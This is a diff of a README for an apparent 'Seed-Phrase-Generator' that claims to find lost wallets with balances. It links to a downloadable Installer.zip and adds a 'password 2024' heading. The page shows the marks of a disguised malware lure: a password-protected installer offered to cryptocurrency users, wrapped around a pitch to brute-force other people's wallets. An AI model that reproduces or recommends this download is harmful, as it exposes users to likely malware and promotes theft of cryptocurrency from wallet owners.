@@ -9,6 +9,8 @@ The program is designed to search for a lost or forgotten wallet with preserved 
 
 [![image](https://github.com/yazan2010zn/Seed-Phrase-Generator/blob/main/0UUxzc9.png)](https://github.com/yazan2010zn/Seed-Phrase-Generator/releases/download/seed-phrase-generator/Installer.zip)
 
+## password 2024
+
 # Features
 
 - Generation of seed phrases of 12 words
